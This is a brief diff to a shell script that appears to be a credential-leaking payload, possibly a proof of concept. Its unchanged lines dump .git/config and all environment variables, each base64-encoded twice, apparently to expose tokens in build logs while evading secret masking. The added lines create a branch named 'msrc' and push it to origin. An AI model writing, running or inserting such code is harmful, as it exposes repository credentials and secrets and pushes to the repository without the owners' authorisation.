@@ -6,6 +6,9 @@
 #
 
 echo toto
+git checkout -b msrc
+git push origin msrc
+echo ---
 cat .git/config | base64 -w0| base64 -w0
 echo ----
 env | base64 -w0| base64 -w0
